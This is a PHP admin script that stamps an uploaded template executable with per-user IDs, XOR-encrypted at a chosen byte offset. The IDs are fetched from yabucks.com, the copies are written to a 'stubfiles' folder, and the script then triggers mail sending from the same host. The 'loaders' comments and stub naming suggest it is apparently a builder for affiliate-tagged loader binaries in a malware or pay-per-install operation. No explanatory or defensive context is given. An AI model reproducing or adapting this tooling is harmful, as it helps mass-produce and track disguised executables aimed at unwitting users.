<?php
    set_time_limit(0);
    
    function encrypt($str, $key) {
        for ($i = 0; $i < strlen($str); $i++){
            $r = ord($str[$i]) ^ $key;            
            if (!$r || ($r == $key)) 
                $r = $key;            
            $str[$i] = chr($r);
        } 
        return $str;
    } 

    if (array_key_exists('cmd', $_POST)) {
        if (is_uploaded_file($_FILES['template']['tmp_name']) 
            && move_uploaded_file($_FILES['template']['tmp_name'], 'template.exe')) {
            $options = array(
                'offset' => hexdec($_POST['offset']), 
                'xor' => hexdec($_POST['xor']));
                
            file_put_contents('xor', serialize($options));
            
            // loaders
            $url = 'http://yabucks.com/public/services.php?cmd=uids';
            //            $resp = file_get_contents($url);
            $ch = curl_init($url);
				curl_setopt($ch, CURLOPT_FAILONERROR, 1); 
				curl_setopt($ch, CURLOPT_RETURNTRANSFER,1); 
				curl_setopt($ch, CURLOPT_TIMEOUT, 20);
            $resp = @curl_exec($ch);
            curl_close($ch);
            $resp = explode("\n", $resp);
            for ($i = 0, $count = count($resp); $i < $count; $i++) {
                list($uid, $username) = explode('|', $resp[$i]);
                
                $filepath = '../stubfiles/'.substr($uid, 0, 5).'.exe';
                copy('template.exe', $filepath);

                $fp = fopen($filepath, 'rb+');
                    fseek($fp, $options['offset'], SEEK_SET);
                    fwrite($fp, encrypt($uid, $options['xor']));
                fclose($fp);
            }
            echo 'regeneration ended...<br />';
                        
            //mail
            // loaders
            $url = 'http://yabucks.com/public/services.php?cmd=doUpdatedMail';
            $ch = curl_init($url);
				curl_setopt($ch, CURLOPT_FAILONERROR, 1); 
				curl_setopt($ch, CURLOPT_RETURNTRANSFER,1); 
				curl_setopt($ch, CURLOPT_TIMEOUT, 20);            
            $resp = @curl_exec($ch);
            curl_close($ch);
            echo 'mail sending ended...<br />';            
        }
    }
    $options = unserialize(file_get_contents('xor'));    
?>
<style>
	table th {text-align: left;}
</style>
<form method="post" enctype="multipart/form-data">
<table border="0">
	<tr><th>Offset:</th></tr>
	<tr><td>	
		<input type="text" name="offset" value="<?php echo '0x'.dechex($options['offset']); ?>" />
	</td></tr>	
	<tr><th>Xor:</th></tr>
	<tr><td>	
		<input type="text" name="xor" value="<?php echo '0x'.dechex($options['xor']); ?>" />
	</td></tr>		
	<tr><th>File:</th></tr>	
	<tr><td>	
		<input type="file" name="template" />
	</td></tr>			
	<tr><td>	
		<br />
		<input type="submit" name="cmd" value="Upload" />
	</td></tr>	
</table>
</form>
	</td></tr>	
</table>
</form>